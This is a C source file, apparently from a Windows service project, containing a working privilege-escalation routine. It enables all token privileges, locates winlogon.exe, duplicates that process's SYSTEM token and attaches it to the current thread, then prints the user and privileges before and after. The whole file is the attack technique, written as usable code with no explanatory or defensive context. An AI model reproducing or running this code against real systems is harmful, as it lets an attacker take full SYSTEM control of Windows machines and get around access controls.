#include "svc.h"

// No user attached to the main thread before attaching a token to it.
void PrintUserNameByProc() {
    TOKEN_USER tokenUser;
    DWORD dwSize = 0;
    HANDLE hToken;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed.\n");
        print_err();
        return;
    }
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
    PTOKEN_USER pTokenUser = malloc(dwSize);
    if (pTokenUser == NULL)
    {
        printf("malloc failed");
        exit(1);
    }
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        // Obtenir le SID de l'utilisateur
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
            printf("User: %s\\%s\n", domain, name);
        else
        {
            printf("LookupAccountSid failed.\n");
            print_err();
        }
    }
    else
        print_err();
    free(pTokenUser);
}

void PrintUserNameByThread() {
    TOKEN_USER tokenUser;
    DWORD dwSize = 0;
    HANDLE hToken;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE,&hToken)) {
        printf("OpenThreadToken failed.\n");
        print_err();
        return;
    }
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
    PTOKEN_USER pTokenUser = malloc(dwSize);
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        // Obtenir le SID de l'utilisateur
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
            printf("User: %s\\%s\n", domain, name);
        else
        {
            printf("LookupAccountSid failed.\n");
            print_err();
        }
    }
    else
        print_err();
    free(pTokenUser);
}

void printPrivileges(HANDLE hToken)
{
    int returnLength;
    TOKEN_PRIVILEGES tp;

    GetTokenInformation(hToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
    PTOKEN_PRIVILEGES pPrivileges = malloc(returnLength);
    if (pPrivileges == NULL) {
        printf("malloc failed.\n");
        exit(1);
    }
    GetTokenInformation(hToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
    for (int i = 0; i < pPrivileges->PrivilegeCount; i++)
    {
        LUID_AND_ATTRIBUTES la = pPrivileges->Privileges[i];
        char name[256];
        DWORD nameLen = sizeof(name);
        if (LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            printf("%s %s", name, ((la.Attributes & SE_PRIVILEGE_ENABLED) ? "(ENABLED)\n" : "(DISABLED)\n"));
        }
    }
    free(pPrivileges);
    pPrivileges = NULL;
}

DWORD GetPIDByProcName()
{
    HANDLE handleProc = NULL;
    PROCESSENTRY32 pe32;

    handleProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (handleProc == INVALID_HANDLE_VALUE)
        exit(print_err());
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(handleProc, &pe32))
    {
        CloseHandle(handleProc);
        exit(print_err());
    }
    if (!strcmp(pe32.szExeFile, "winlogon.exe"))
    {
        printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
        CloseHandle(handleProc);
        return  pe32.th32ProcessID;
    }
    while (Process32Next(handleProc, &pe32))
    {
        if (!strcmp(pe32.szExeFile, "winlogon.exe"))
        {
            printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
            CloseHandle(handleProc);
            return pe32.th32ProcessID;
        }
    }
    CloseHandle(handleProc);
    printf("Impossible to find winlogon.exe's PID. WHAT THE FU ??\n");
    exit(ERROR);
}

BOOL EnableAllPrivilege(HANDLE currentToken)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    int returnLength;

    GetTokenInformation(currentToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
    PTOKEN_PRIVILEGES pPrivileges = malloc(returnLength);
    if (pPrivileges == NULL) {
        printf("malloc failed.\n");
        exit(1);
    }
    GetTokenInformation(currentToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
    for (int i = 0; i < pPrivileges->PrivilegeCount; i++)
        pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(currentToken, FALSE, pPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges failed.\n");
        exit(print_err());
    }
    return TRUE;
}

void ImpersonateSystemToken()
{
    HANDLE sysToken = NULL;
    HANDLE procHandle = NULL;
    HANDLE newSysTok = NULL;
    HANDLE tmpProcHandle = NULL; 
    HANDLE currentToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
    {
        printf("OpenProcessToken failed.\n");
        exit(print_err());
    }
    EnableAllPrivilege(currentToken);
    // no token attached to the current thread, so we use the proc instead.
    PrintUserNameByProc();
    printf("\n=== Privileges before impersonation ===\n\n");
    printPrivileges(GetCurrentProcessToken());
    procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, GetPIDByProcName());
    if (procHandle == NULL)
    {
        printf("Impossible to get the process handle.\n");
        exit(print_err());
    }
    BOOL success = OpenProcessToken(procHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &sysToken);
    if (!success)
    {
        printf("Could not open the process token.\n");
        exit(print_err());
    }
    success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS_P, NULL, SecurityImpersonation,  TokenImpersonation, &newSysTok);
    if (!success)
    {
        printf("Could not duplicate the process token.\n");
        exit(print_err());
    }
    success = SetThreadToken((PHANDLE)NULL, newSysTok);
    if (!success)
    {
        printf("Failed to set the current thread's token.\n");
        exit(print_err());
    }
    PrintUserNameByThread();
    printf("\n=== Privileges for the thread after impersonation ===\n\n");
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
    {
        printf("OpenThreadToken failed.\n");
        exit(print_err());
    }
    EnableAllPrivilege(currentToken);
    printPrivileges(GetCurrentThreadToken()); 
}
